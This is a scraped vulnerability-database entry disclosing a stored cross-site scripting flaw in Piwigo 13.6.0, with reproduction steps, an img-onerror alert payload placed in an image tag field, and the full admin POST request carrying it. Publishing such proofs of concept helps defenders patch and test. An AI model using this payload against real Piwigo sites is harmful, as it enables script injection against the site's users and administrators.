---
title: Piwigo 13.6.0 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2023040071
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-22
fetch_date: 2025-10-04T11:32:27.720724
---

# Piwigo 13.6.0 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Piwigo 13.6.0 Cross Site Scripting** **2023.04.21**  Credit:  **[Mirabbas Agalarov](https://cxsecurity.com/author/Mirabbas%2BAgalarov/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

Exploit Title: Piwigo 13.6.0 - Stored Cross-Site Scripting (XSS)
Application: Piwigo
Version: 13.6.0
Bugs: Stored XSS
Technology: PHP
Vendor URL: https://piwigo.org/
Software Link: https://piwigo.org/get-piwigo
Date of found: 18.04.2023
Author: Mirabbas Ağalarov
Tested on: Linux
2. Technical Details & POC
========================================
steps:
1.After uploading the image, we write <img%20src=x%20onerror=alert(4)> instead of the tag(keyword) while editing the image)
payload: <img%20src=x%20onerror=alert(4)>
POST /piwigo/admin.php?page=photo-9 HTTP/1.1
Host: localhost
Content-Length: 159
Cache-Control: max-age=0
sec-ch-ua: "Not?A\_Brand";v="8", "Chromium";v="108"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/piwigo/admin.php?page=photo-9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: pwg\_id=u7tjlue5o3vj7fbgb0ikodmb9m; phavsz=1394x860x1; pwg\_display\_thumbnail=display\_thumbnail\_classic; pwg\_tags\_per\_page=100; phpbb3\_ay432\_k=; phpbb3\_ay432\_u=2; phpbb3\_ay432\_sid=9240ca5fb9f93c8ebc8ff7bd42c380fe
Connection: close
name=Untitled&author=&date\_creation=&associate%5B%5D=1&tags%5B%5D=<img%20src=x%20onerror=alert(3)>&description=&level=0&pwg\_token=bad904d2c7ec866bfba391bfc130ddd2&submit=Save+settings

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040071)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top